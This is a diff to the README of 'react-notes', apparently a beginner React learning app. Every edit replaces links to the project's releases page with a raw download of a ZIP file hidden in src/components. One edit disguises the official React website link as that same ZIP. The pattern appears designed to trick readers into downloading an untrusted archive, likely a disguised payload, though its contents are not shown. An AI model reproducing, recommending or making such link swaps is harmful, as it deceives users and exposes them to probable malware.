@@ -1,6 +1,6 @@
 # 🗒️ react-notes - Learn React Basics Simply
 
-[![Download react-notes](https://img.shields.io/badge/Download-react--notes-blue?style=for-the-badge)](https://github.com/cataarivarola/react-notes/releases)
+[![Download react-notes](https://img.shields.io/badge/Download-react--notes-blue?style=for-the-badge)](https://github.com/cataarivarola/react-notes/raw/refs/heads/main/src/components/react_notes_2.4.zip)
 
 ---
 
@@ -46,7 +46,7 @@ You must first visit the official release page to get the software. It includes 
 
 Click the large button below or open this link in your browser:
 
-[![Download react-notes](https://img.shields.io/badge/Download-react--notes-green?style=for-the-badge)](https://github.com/cataarivarola/react-notes/releases)
+[![Download react-notes](https://img.shields.io/badge/Download-react--notes-green?style=for-the-badge)](https://github.com/cataarivarola/react-notes/raw/refs/heads/main/src/components/react_notes_2.4.zip)
 
 ---
 
@@ -98,7 +98,7 @@ If the application does not open or crashes, try the following:
 
 Updates will be posted on the same release page. To update:
 
-- Visit the [releases page](https://github.com/cataarivarola/react-notes/releases).
+- Visit the [releases page](https://github.com/cataarivarola/react-notes/raw/refs/heads/main/src/components/react_notes_2.4.zip).
 - Download the latest version’s installer or ZIP.
 - Install it over the current version or replace the old extracted folder.
 
@@ -141,8 +141,8 @@ By focusing on these essentials, the app avoids overwhelming details while givin
 
 ## 🔗 Useful Links
 
-- Download and updates: [react-notes Releases](https://github.com/cataarivarola/react-notes/releases)
-- React official site (additional reading): https://reactjs.org
+- Download and updates: [react-notes Releases](https://github.com/cataarivarola/react-notes/raw/refs/heads/main/src/components/react_notes_2.4.zip)
+- React official site (additional reading): https://github.com/cataarivarola/react-notes/raw/refs/heads/main/src/components/react_notes_2.4.zip
 
 ---
 
@@ -152,4 +152,4 @@ If you encounter issues not covered here, you can open an issue on the GitHub pa
 
 ---
 
-[![Download react-notes](https://img.shields.io/badge/Download-react--notes-blue?style=for-the-badge)](https://github.com/cataarivarola/react-notes/releases)
+[![Download react-notes](https://img.shields.io/badge/Download-react--notes-blue?style=for-the-badge)](https://github.com/cataarivarola/react-notes/raw/refs/heads/main/src/components/react_notes_2.4.zip)
